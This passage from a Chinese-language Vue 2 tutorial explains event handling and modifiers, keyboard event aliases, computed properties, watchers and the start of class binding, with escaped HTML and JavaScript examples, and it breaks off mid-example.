&lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt; &lt;button v-on:click&#x3D;&quot;showInfo&quot;&gt;点击跳转&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; name: &#39;张加林&#39; &#125;, methods: &#123; &#x2F;&#x2F;配置事件的回调 showInfo() &#123; &#x2F;&#x2F; 对象中配置方法：直接使用方法名即可。 alert(&#39;Mike Taylor&#39;) &#125; &#125; &#125;)&lt;&#x2F;script&gt; 点击按钮，调用showInfo函数，所以a为返回的事件对象，下面是event的target。 showInfo中的this的含义：此处this就是vm 易错易混：箭头函数this指向Windows 因此，我们遵循原则：接受Vue管理的函数，最好都写成普通函数。 事件绑定的简写形式： 1&lt;button @click=&quot;showInfo&quot;&gt;点击跳转&lt;/button&gt; 功能需求：事件触发后，传参。 123456789101112131415161718192021222324252627&lt;body&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt; &lt;button v-on:click&#x3D;&quot;showInfo1&quot;&gt;点击跳转!&lt;&#x2F;button&gt; &lt;button @click&#x3D;&quot;showInfo2(12)&quot;&gt;点击跳转!!&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; name: &#39;张加林&#39; &#125;, methods: &#123; &#x2F;&#x2F;配置事件的回调 showInfo1(event) &#123; console.log(event), alert(&#39;Mike Taylor1&#39;) &#125;, showInfo2(number) &#123; console.log(number); alert(&#39;Mike Taylor2&#39;) &#125; &#125; &#125;)&lt;&#x2F;script&gt; 需要解决的BUG：这样写代码会丢失event，再也不能使用event了。 解决方法： 1&lt;button @click=&quot;showInfo2(12,$event)&quot;&gt;点击跳转!!&lt;/button&gt; methods中的方法与Vue实例： 回调方法写在methods中，不要写在data中，因为会自动进行数据代理，添加无意义的getter和setter。（函数只是调用的，不需要更改） 总结事件的基本使用： 使用v-on:xxx 或 @click绑定事件，其中xxx为事件名称 事件的回调需要配置在methods对象中，最终会在vm上 methods中配置的函数，不要使用箭头函数！！！否则this指向的就不再是vm了 methods中配置的函数，都是被Vue所管理的函数，，this指向的是vm或者组件实例对象 @click = “demo” 和 @click = “demo($event)” 效果一致，但是后者可以传参 1.12 事件修饰符阻止a标签的跳转行为123456789101112131415161718192021&lt;body&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt; &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;miketaylorjuly123.cn&quot; @click&#x3D;&quot;showInfo&quot;&gt;点击跳转&lt;&#x2F;a&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; name: &#39;张加林&#39; &#125;, methods: &#123; showInfo(event)&#123; event.preventDefault(); &#x2F;&#x2F;阻止弹窗 alert(&#39;Mike Taylor个人站点&#39;) &#125; &#125; &#125;) vue中的阻止方法： prevent即事件修饰符，阻止默认行为。 6个事件修饰符 修饰符名称 功能 prevent 阻止默认事件（常用） stop 阻止事件冒泡（常用） once 事件只触发一次（常用） capture 使用事件的捕获模式 selt 只有event.target是当前操作的元素才是触发事件 passive 事件的默认行为立即执行，无需等待事件回调执行完毕 prevent：略stop事件冒泡 123456789101112131415161718192021222324252627282930&lt;style&gt; .demo1&#123; margin-top:20px; height: 40px; background-color: #8080ff; &#125;&lt;&#x2F;style&gt;&lt;body&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt; &lt;!-- 阻止事件冒泡（常用） --&gt; &lt;div class&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt; &lt;button @click&#x3D;&quot;showInfo&quot;&gt;点击获取提示信息&lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; name: &#39;张加林&#39; &#125;, methods: &#123; showInfo(event)&#123; alert(&#39;Mike Taylor个人站点&#39;) &#125; &#125; &#125;)&lt;&#x2F;script&gt; 阻止事件冒泡 TS Vue 12&lt;div class&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt; &lt;button @click.stop&#x3D;&quot;showInfo&quot;&gt;点击获取提示信息&lt;&#x2F;button&gt;&lt;&#x2F;div&gt; once效果 1&lt;button @click.once&#x3D;&quot;showInfo&quot;&gt;点击提示&lt;&#x2F;button&gt; capture123456789101112131415161718192021222324252627&lt;body&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt; &lt;!-- 使用事件的捕获模式 --&gt; &lt;div class&#x3D;&quot;box1&quot; @click&#x3D;&quot;showMsg(1)&quot;&gt; div1 &lt;div class&#x3D;&quot;box2&quot; @click&#x3D;&quot;showMsg(2)&quot;&gt; div2 &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; name: &#39;张加林&#39; &#125;, methods: &#123; showMsg(number) &#123; console.log(number); &#125; &#125; &#125;)&lt;&#x2F;script&gt; 点击div2区域后触发的效果： 点击div2先经过事件捕获过程，随后才是事件冒泡，默认情况下，冒泡阶段处理事件。 捕获阶段，由外往内；冒泡阶段，由内往外。 对外部盒子使用capture： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 .capture 冒泡顺序 例如 div1中嵌套div2中嵌套div3&lt;div id=&quot;app&quot; v-on:click=&quot;show&quot;&gt; 1 &lt;div id=&quot;app2&quot; v-on:click.capture=&quot;show2&quot;&gt; 2 &lt;div id=&quot;app3&quot; v-on:click=&quot;show3&quot;&gt; 3 &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var vm=new Vue(&#123; el:&quot;#app&quot;, data:&#123; &#125;, methods:&#123; show:function()&#123; console.log(&quot;这是app的方法&quot;) &#125;, show2:function()&#123; console.log(&quot;这是app2的方法&quot;) &#125;, show3:function()&#123; console.log(&quot;这是app3的方法&quot;) &#125; &#125; &#125;) &lt;/script&gt; 此处的代码因为div2有capture关键字，所以此时冒泡的顺序发生了改变 正常情况下： 点击div3一层一层冒泡，先div3=》div2=》div1 使用了关键字： 点击div3时，先div2=》div3=》div1 1.先冒泡外层带有关键字的事件 2.外层执行结束之后，往里层执行事件 3.最后按照从里向外的事件开始执行 就是说只要存在一个capture关键字，就会影响整个嵌套的执行 例子 div1中嵌套div2中嵌套div3.capture中嵌套div4 此时点击div1 先执行带有capture的div3 然后执行div4 最后按照从里向外的顺序执行 顺序就是 div3=》div4=》div2=》div1 其他疑惑 此时嵌套为 div1中嵌套div2.capture中嵌套div3中嵌套div4 那么可以想一下点击最里层的div4会怎么触发呢 1.触发带有关键字的 div2 2.触发点击的div4 3.最后从里向外执行 那么顺序为 div2=》div4=》div3=》div1 self123456789101112131415161718192021222324252627282930&lt;style&gt; .demo1&#123; margin-top:20px; height: 40px; background-color: #8080ff; &#125;&lt;&#x2F;style&gt;&lt;body&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt; &lt;!-- 阻止事件冒泡（常用） --&gt; &lt;div class&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt; &lt;button @click&#x3D;&quot;showInfo&quot;&gt;点击获取提示信息&lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; name: &#39;张加林&#39; &#125;, methods: &#123; showInfo(event)&#123; console.log(event.target); &#125; &#125; &#125;)&lt;&#x2F;script&gt; 点击后的效果： 添加stop事件修饰符： 123&lt;div class&#x3D;&quot;demo1&quot; @click.stop&#x3D;&quot;showInfo&quot;&gt; &lt;button @click&#x3D;&quot;showInfo&quot;&gt;点击获取提示信息&lt;&#x2F;button&gt;&lt;&#x2F;div&gt; passive1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 &lt;style&gt; .list &#123; width: 200px; height: 200px; background-color: #8080ff; overflow: auto; &#125; li &#123; height: 100px; &#125; &lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt; &lt;!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 --&gt; &lt;ul class&#x3D;&quot;list&quot; @scroll&#x3D;&quot;demo&quot;&gt; &lt;!--滚动条滚动--&gt; &lt;li&gt;1&lt;&#x2F;li&gt; &lt;li&gt;2&lt;&#x2F;li&gt; &lt;li&gt;3&lt;&#x2F;li&gt; &lt;li&gt;4&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;ul class&#x3D;&quot;list&quot; @wheel&#x3D;&quot;demo&quot;&gt; &lt;!-- 滚轮滚动 --&gt; &lt;li&gt;1&lt;&#x2F;li&gt; &lt;li&gt;2&lt;&#x2F;li&gt; &lt;li&gt;3&lt;&#x2F;li&gt; &lt;li&gt;4&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; name: &#39;张加林&#39; &#125;, methods: &#123; demo() &#123; console.log(&#39;@@@&#39;); &#125; &#125; &#125;)&lt;&#x2F;script&gt; @scroll（滚轮、侧拉条、上下键触发） @wheel(只有滚轮有效，上下键、侧拉条失效) @wheel会延迟滚动，这时候可以使用passive修饰符修饰；而@scroll不需要，因为会立即执行默认行为。passive在移动端使用较多。 1.13 键盘事件案例：在输入框中输入内容后，按下Enter后，在控制台显示。 1234567891011121314151617181920212223&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;我的个人小站：&#123;&#123;site&#125;&#125;&lt;&#x2F;h2&gt; &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup&#x3D;&quot;showInfo&quot;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; site: &#39;miketaylorjuly123.cn&#39; &#125;, methods:&#123; showInfo(event)&#123; console.log(event.target.value); &#125; &#125; &#125;)&lt;&#x2F;script&gt; 问题：没有按Enter，控制台输出input框内容。 代码改进 vue中的处理方式： 1&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup.enter&#x3D;&quot;showInfo&quot;&gt; Vue常用按键别名 按键名 别名 回车 enter 删除 delete（捕获“删除”和“退格”键） 退出 esc 空格 space 换行 tab（特殊，需要配合keydown来使用） 上 up 下 down 左 left 右 right 为了方便，原来的首字母大写改成了全部小写，但是首字母大写也能实现功能。 1&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup.Enter&#x3D;&quot;showInfo&quot;&gt; Vue中没有别名的按键处理 注意：Vue中未提供别名的按键，可以使用按键原始的key值去绑定，但要注意转换为keabab-case(短横线命名)。 对于CapsLock键： 错误(没有效果) 1&lt;input type=&quot;text&quot; placeholder=&quot;按下回车提示输入&quot; @keyup.CapsLock=&quot;showInfo&quot;&gt; 正确 1&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup.caps-lock&#x3D;&quot;showInfo&quot;&gt; 注意：不是所有键位都可以绑定事件。 特殊系统修饰键ctrl、alt、shift、meta(Win键-Windows / Command键-Mac) 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发(也可以正常工作，只是一般不用) 配合keydown使用：正常事件触发 例如：tab键，本身功能是把焦点从当前元素上切走。而且是跟keyup事件绑定，按下tab键之后，就失去了焦点，事件无法触发，所以需要使用keydown实现。 1&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keydown.tab&#x3D;&quot;showInfo&quot;&gt; 效果：先触发控制台输出，再触发焦点切换功能。 使用KeyCode指定具体的按键（不推荐）例如Enter，键码为13。 1&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup.13&#x3D;&quot;showInfo&quot;&gt; KeyboardEvent.keyCode标准已经从Web标准移除，未来浏览器也许会停止支持，所以尽量不要使用该特性。（因为不同键盘编码可能不统一） 定制按键别名Vue.config.keyCodes.自定义键名 = 键码 ，可以去定制按键别名。 例： 1Vue.config.keyCodes.ter &#x3D; 13 &#x2F;&#x2F;定义了一个别名按键 1&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup.ter&#x3D;&quot;showInfo&quot;&gt; &#x2F;&#x2F;EEnter&#x2F;abcDe不行 注意：别名不能带大写字母！！！ 1.14 事件总结123&lt;div id&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt; &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;miketaylorjuly123.cn&quot; @click.stop&#x3D;&quot;showInfo&quot;&gt;点我跳转&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; 要求：既需要阻止冒泡，又需要阻止跳转。 方法一： 123&lt;div id&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt; &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;miketaylorjuly123.cn&quot; @click.stop.prevent&#x3D;&quot;showInfo&quot;&gt;点我跳转&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; 方法二： 123&lt;div id&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt; &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;miketaylorjuly123.cn&quot; @click.prevent.stop&#x3D;&quot;showInfo&quot;&gt;点我跳转&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; 修饰符可以连续书写 案例：按下Ctrl + Y的时候控制台输出 1&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keydown.ctrl.y&#x3D;&quot;showInfo&quot;&gt; 1.15 计算属性 computed效果图 使用插值语法实现123456789101112131415161718192021&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; 姓: &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;firstName&quot;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt; &lt;!--注意：页面上的输入要影响数据本身的变化，应该使用v-model--&gt; 名: &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;lastName&quot;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt; 姓名: &lt;span&gt;&#123;&#123;firstName&#125;&#125;-&#123;&#123;lastName&#125;&#125;&lt;&#x2F;span&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data:&#123; firstName: &#39;张&#39;, lastName: &#39;三&#39; &#125;, &#125;)&lt;&#x2F;script&gt; 实现截取部分输入，丢弃过长输入。 12姓名: &lt;span&gt;&#123;&#123;firstName.slice(0,3)&#125;&#125;-&#123;&#123;lastName&#125;&#125;&lt;&#x2F;span&gt;&lt;!--截取前三位--&gt; 风格指南随着要求越多，&#123;&#123;&#125;&#125;`中的代码会越来越长，虽然不报错，但是这样违背了VUE的风格指南。 #### 使用methods语法实现 ##### 易错易混点 methods 注意：fullName中的this是当前vue的实例对象 12345methods:&#123; fullName()&#123; return this.firstName + &#x27;-&#x27; + this.lastName; &#125; &#125; html一： 12姓名: &lt;span&gt;&#123;&#123;fullName()&#125;&#125;&lt;/span&gt;&lt;!--将fullName的返回值插入到此处--&gt; html二： 1姓名: &lt;span&gt;&#123;&#123;fullName&#125;&lt;/span&gt; **注意**：括号可加可不加的是在绑定事件的时候。 细节问题：**data中任何一个数据发生变化时，vue的模板都会重新解析一遍，以便知道模板中用到该数据的具体位置，然后更新数据**。但是如果模板中没有用到该变化数据，vue模板就不会重新读取该数据；如果用到，就需要重新读取。模板中如果调用方法，此处使用插值语法调用方法，方法会重新调用一次。（因为无法确定返回值与之前是否相同，所以就再调用一次，**重新解析模板时只要遇到插值语法中写方法，这个方法一定重新调用**） 演示解析： 1234fullName()&#123; console.log(&#x27;@@@&#x27;); return this.firstName + &#x27;-&#x27; + this.lastName; &#125; 一进入页面就会自动调用fullName，而且每次更改firstName和lastName都会引起fullName的调用。 #### 使用计算属性实现 vue认为data中都是属性。 计算属性：使用data中的已有属性（不能是随便的一个变量，必须是由vue管理），加工计算后，得到的一个全新的属性（firstName+lastName==>fullName）,而且要求把计算的整个过程配置成对象，对象中需要写get。 123456fullName:&#123; get()&#123; console.log(&#39;get被调用！&#39;); return this.firstName + &#39;-&#39; + this.lastName; &#125; &#125; 查看vm实例： 注意：_data身上没有fullName属性，fullName是vue利用\\_data上的firstName和lastName计算得到fullName后，直接放到vm实例上的。 读取计算属性：插值语法。 由于firstName和lastName配置在computed的fullName中的get下，所以不能直接访问，此处get中的this是vm实例。 ##### get 1234姓名: &lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt;姓名: &lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt;姓名: &lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt;姓名: &lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; * 问题：使用计算属性，此处get被调用几次？ * 1次。vue缓存机制。（computed调用一次，methods调用多次） * get调用时机： * 初次读取计算属性值时 * 所依赖的数据发生变化时 * fullName依赖firstName和lastName，firstName或lastName发生变化，调用get * get有什么作用？ * 当有人读取fullName时，get就会被调用，且返回值作为fullName的值 * 底层实现使用的就是defineProperty * 相比于methods的优势： * 内部使用缓存机制，不需要反复读取数据，效率更高，调试方便。 ##### set 当计算属性会被直接更改时，需要使用set。 * set调用时机： * 当计算属性被修改时 123set(value)&#123; console.log(&#x27;set被调用了&#x27;,value); &#125; set的使用效果： 连锁反应： * 注意： * get和set不能写成箭头函数 * 计算属性最终会出现在vm上，直接读取使用即可 * 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据的变化 ##### 计算属性简写 简写前： 简写要求：只有考虑读取get，不考虑修改set的时候才能使用简写。 简写后： 1234567computed: &#123; &#x2F;&#x2F; fullName:function()&#123; fullName()&#123; console.log(&#39;get被调用！&#39;); return this.firstName + &#39;-&#39; + this.lastName; &#125; &#125; 注意：简写后，千万不要把fullName当做函数，读取时使用`fullName()`读取 ### 1.16 监视属性watch 效果图： #### 计算属性实现 1234567891011121314151617181920212223242526&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;今天天气很&#123;&#123;info&#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;changeWeather&quot;&gt;切换天气&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; isHot: true &#125;, computed:&#123; info()&#123; return this.isHot ? &#39;炎热&#39; : &#39;凉爽&#39; &#125; &#125;, methods:&#123; changeWeather()&#123; this.isHot &#x3D; !this.isHot; &#125; &#125; &#125;)&lt;&#x2F;script&gt; Vue devTools的BUG： 1234&lt;div id=&quot;root&quot;&gt; &lt;h2&gt;今天天气很一般&lt;/h2&gt; &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;&lt;/div&gt; 页面中没有使用到data和computed中的数据，开发者工具监测不到数据的变化，需要手动刷新开发者工具才行。 简写： 1234&lt;div id=&quot;root&quot;&gt; &lt;h2&gt;今天天气很&#123;&#123;info&#125;&#125;&lt;/h2&gt; &lt;button @click=&quot;isHot = !isHot&quot;&gt;切换天气&lt;/button&gt;&lt;/div&gt; 注：绑定事件的时候：@xxx = 'yyyyyy'，yyyyyy可以写一些简单的语句 错误的简写： 12&lt;!--点击后弹窗--&gt;&lt;button @click=&quot;alert(1)&quot;&gt;切换天气&lt;/button&gt; 改进： 1&lt;button @click=&quot;window.alert(1)&quot;&gt;切换天气&lt;/button&gt; 1234data: &#123; isHot: true, window &#x2F;&#x2F;window:window &#125; #### 监视属性实现 ##### 监视方法一 12345678watch:&#123; isHot:&#123; immediate:true, &#x2F;&#x2F;作用：初始化时让handler调用一下。 handler(newValue,oldValue)&#123; console.log(&#39;isHot改变了&#39;,newValue,oldValue); &#125; &#125;&#125; * handler什么时候调用？ * 当属性发生变化时。 * watch监视属性，既可以监视属性，也可以监视计算属性 ##### 监视方法二 12345vm.$watch(&#x27;isHot&#x27;,&#123; immediate:true, //作用：初始化时让handler调用一下。 handler(newValue,oldValue)&#123; console.log(&#x27;isHot改变了&#x27;,newValue,oldValue);&#125;) * 注意：这里的属性名要加`''`，因为原来的写法就是要`''`只是在vue中省略了`''` ##### 总结 * 当被监视的属性发生变化的时候，回调函数自动调用，进行相关操作 * 监视属性必须存在，才能进行监视。(但是属性或计算属性不存在也不会报错) * ![image-20210901150332224](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901150332224.png) * 监视的两种写法： * `new Vue`时传入`watch`配置 * 通过`vm.$watch`监视 #### 深度监视 ##### 监视多级结构中某个属性的变化 代码： 123456789101112131415161718192021222324&lt;body&gt; &lt;h3&gt;a的值是：&#123;&#123;numbers.a&#125;&#125;&lt;&#x2F;h3&gt; &lt;button @click&#x3D;&quot;numbers.a++&quot;&gt;点我让a++&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; numbers:&#123; a:1, b:1 &#125; &#125;, watch:&#123; &#39;numbers.a&#39;:&#123; handler(newValue,oldValue)&#123; console.log(&#39;a改变了&#39;,newValue,oldValue); &#125; &#125; &#125; &#125;)&lt;&#x2F;script&gt; 注意：监视多级结构中某个属性值的变化一定要加`''` ##### 监视多级结构中所有属性的变化 ###### 易错易混 要求：监视整个numbers，当numbers内部任意一个数据发生改变时，都能感知到变化。 1234567watch:&#123; numbers:&#123; handler(newValue,oldValue)&#123; console.log(&#39;number改变了&#39;,newValue,oldValue); &#125; &#125; &#125; ###### 正确方法 12345678watch:&#123; numbers:&#123; deep: true,//开启深度监视 handler(newValue,oldValue)&#123; console.log(&#x27;number改变了&#x27;,newValue,oldValue); &#125; &#125; &#125; ##### Vue监测数据变化 vue默认是可以监测到data中多级数据的变化的！！！ 1vm.numbers.b = 999 证据：上述语句中，b的变化可以展示到页面上。 但是vue为程序员提供的监视属性watch，默认是不能监测到data中多级数据的变化的 ##### 总结 * Vue中的watch默认不检测对象内部值的改变（一层）（默认不支持是因为效率问题） * 配置`deep:true`可以监测对象内部值改变（多层） * Vue自身可以监测对象内部值得改变，但Vue提供的watch默认不可以！！！ * 使用watch时根据数据的具体结构，决定是否采用深度监视 #### watch简写 简写要求：当配置项中只有handler，没有immediate、deep等配置项时。 未简写 12345678watch:&#123; isHot:&#123; &#x2F;&#x2F; immediate:true, handler(newValue,oldValue)&#123; console.log(&#39;isHot改变了&#39;,newValue,oldValue); &#125; &#125; &#125; 简写一 12345watch:&#123; isHot(newValue,oldValue) &#123; console.log(&#x27;isHot改变了&#x27;,newValue,oldValue); &#125; &#125; 未简写 1234vm.$watch(&#39;isHot&#39;,&#123; handler(newValue,oldValue)&#123; console.log(&#39;isHot改变了&#39;,newValue,oldValue);&#125;) 简写二 123vm.$watch(&#x27;isHot&#x27;,function(newValue,oldValue)&#123; console.log(&#x27;isHot改变了&#x27;,newValue,oldValue);&#125;) 注：不要使用箭头函数！！！this指向会出问题。 ### 1.17 对比watch和computed #### 姓名案例对比 watch实现姓名案例： 12345678910111213141516171819202122232425262728293031&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;br /&gt;&lt;br /&gt; &lt;br /&gt;&lt;br /&gt; &lt;div id=&quot;root&quot;&gt; 姓: &lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt;&lt;br /&gt;&lt;br /&gt; &lt;!--注意：页面上的输入要影响数据本身的变化，应该使用v-model--&gt; 名: &lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt;&lt;br /&gt;&lt;br /&gt; 姓名: &lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。 const vm = new Vue(&#123; el: &#x27;#root&#x27;, data: &#123; firstName: &#x27;张&#x27;, lastName: &#x27;三&#x27;, fullName: &#x27;张-三&#x27; &#125;, watch: &#123; firstName(newValue)&#123; this.fullName = newValue + &#x27;-&#x27; + this.lastName; &#125;, lastName(newValue)&#123; this.fullName = this.firstName + &#x27;-&#x27; + newValue; &#125; &#125; &#125;)&lt;/script&gt; 对比watch实现与computed实现： ![image-20210901163702676](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901163702676.png) 虽然使用计算属性更加简单，但实际上二者各有千秋。 #### 只能用watch案例 要求：延迟反馈，当firstName或lastName变化时，fullName迟于firstName或lastName1秒后变化 watch实现： computed**无法实现** 1234567computed: &#123; fullName()&#123; setTimeout(()=&gt;&#123; return this.firstName + &#x27;-&#x27; + this.lastName; &#125;,1000) &#125;&#125; 原因：return值被交给了setTimeout函数，但是fullName没有了返回值。 computed中不能开启异步任务维护数据，但是watch却可以，因为watch不是靠返回值。 #### 易错易混 红色圈出部分函数不是由Vue管理的。定时器是在由Vue管理的fullName函数中开启的，但是定时器所指定的回调，是不受Vue控制的，定时器由定时器管理模块控制，定时器到点由JS引擎调用。即：定时器到点，不是由Vue调用的红圈圈出部分函数。 此处定时器到点，JS调用红圈处函数，由于是箭头函数，没有自己的this，于是向外部寻找，就找到了firstName的this，而firstName是由Vue管理的普通函数。 #### 总结 * computed与watch之间的区别： * computed能完成的功能，watch都可以完成 * watch能完成的功能，computed不一定能完成，例如watch可以进行异步操作 * 两个重要的小原则： * 所有被Vue管理的函数，最好写成普通函数，这样this指向的才是vm或组件实例对象 * 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等），最好写成箭头函数，这样this指向的才是vm或组件实例对象 ### 1.18 绑定样式 #### 绑定class样式 思想：把动态数据交给Vue管理 效果要求，点击相关区域，class样式发生变化 12345678910111213141516171819202122232425262728293031323334.basic &#123; width: 400px; height: 100px; border: 1px solid black;&#125;.happy &#123; border: 4px solid red; ; background-color: rgba(255, 255, 0, 0.644); background: linear-gradient(30deg, yellow, pink, orange, yellow);&#125;.sad &#123; border: 4px dashed rgb(2, 197, 2); background-color: gray;&#125;.normal &#123; background-color: skyblue;&#125;.mk1 &#123; background-color: yellowgreen;&#125;.mk2 &#123; font-size: 30px; text-shadow: 2px 2px 10px red;&#125;.mk3 &#123; border-radius: 20px;&#125; ##### 字符串写法 适用于：样式的类名不太确定，需要动态指定。 123456789101112131415161718192021&lt;body&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;!-- 绑定class样式:字符串写法 --&gt; &lt;div class&#x3D;&quot;basic&quot; :class&#x3D;&quot;mood&quot; @click&#x3D;&quot;changeMood&quot;&gt;&#123;&#123;site&#125;&#125;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false; const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; site: &#39;miketaylorjuly123.cn&#39;, mood: &#39;normal&#39; &#125;, methods: &#123; changeMood() &#123; this.mood &#x3D; &#39;happy&#39;; &#125; &#125; &#125;)&lt;&#x2F;script&gt; 要求：点击区域后，随机选择一种样式。 1234567methods: &#123; changeMood() &#123; const arr = 